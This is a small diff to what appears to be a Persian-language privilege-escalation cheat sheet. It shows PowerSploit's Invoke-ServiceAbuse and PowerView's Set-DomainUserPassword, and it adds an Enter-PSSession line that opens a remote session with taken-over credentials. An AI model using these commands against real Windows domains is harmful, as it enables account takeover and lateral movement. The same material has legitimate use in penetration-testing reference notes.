@@ -511,6 +511,7 @@ Invoke-ServiceAbuse -Name ‘vds’ -UserName ‘domain\user1’
 https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
 Import-Module .\PowerView_dev.ps1
 Set-DomainUserPassword -Identity user1 -verbose
+Enter-PSSession -ComputerName COMPUTERNAME -Credential “”
 ```
 
 ### ارتقا دسترسی با gdbus
